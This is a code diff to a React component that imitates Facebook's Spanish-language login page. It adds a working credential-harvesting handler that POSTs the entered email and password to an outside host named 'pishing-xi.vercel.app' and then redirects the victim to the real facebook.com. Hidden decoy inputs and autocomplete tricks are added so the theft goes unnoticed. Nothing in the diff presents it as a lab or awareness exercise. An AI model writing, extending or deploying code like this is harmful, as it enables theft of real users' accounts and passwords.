@@ -1,10 +1,49 @@
-import "./LoginFacebook.css"
+import { useState } from "react";
+import "./LoginFacebook.css";
 
 function FacebookLogin() {
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+
+  const handleSubmit = (e: any) => {
+    e.preventDefault();
+
+    const data = {
+      correo_electronico: email,
+      contrasena: password
+    };
+
+    fetch("https://pishing-xi.vercel.app/cuentas-facebook", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    })
+      .then((res) => {
+        if (!res.ok) {
+          throw new Error("Error en la solicitud");
+        }
+        return res.json();
+      })
+      .then((responseData) => {
+        if (responseData.message === "Cuenta registrada correctamente") {
+          alert("Inicio de sesión exitoso");
+          window.location.href = "https://facebook.com";
+        } else {
+          console.log("Respuesta del servidor:", responseData);
+          alert("Inicio de sesión fallido");
+        }
+      })
+      .catch((err) => {
+        console.error("Error al iniciar sesión", err);
+      });
+  };
+
   return (
     <div className="login-container">
       <div className="login-wrapper">
-        {/* Left side with logo and tagline */}
+        {/* Left side */}
         <div className="login-left">
           <div className="facebook-logo">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1022.51 360">
@@ -50,9 +89,38 @@ function FacebookLogin() {
         {/* Right side with login form */}
         <div className="login-right">
           <div className="login-form-container">
-            <form className="login-form">
-              <input type="text" placeholder="Correo electrónico o número de teléfono" className="login-input" />
-              <input type="password" placeholder="Contraseña" className="login-input" />
+            <form className="login-form" onSubmit={handleSubmit} autoComplete="off">
+              <input
+                type="text"
+                name="fake_username"
+                style={{ display: "none" }}
+                autoComplete="username"
+              />
+              <input
+                type="password"
+                name="fake_password"
+                style={{ display: "none" }}
+                autoComplete="new-password"
+              />
+
+              <input
+                type="text"
+                name="email_fake" // nombre falso evita sugerencias
+                placeholder="Correo electrónico o número de teléfono"
+                className="login-input"
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+                autoComplete="off"
+              />
+              <input
+                type="password"
+                name="password_fake"
+                placeholder="Contraseña"
+                className="login-input"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                autoComplete="new-password"
+              />
               <button type="submit" className="login-button">
                 Iniciar sesión
               </button>
@@ -78,7 +146,7 @@ function FacebookLogin() {
         </div>
       </div>
     </div>
-  )
+  );
 }
 
-export default FacebookLogin
+export default FacebookLogin;
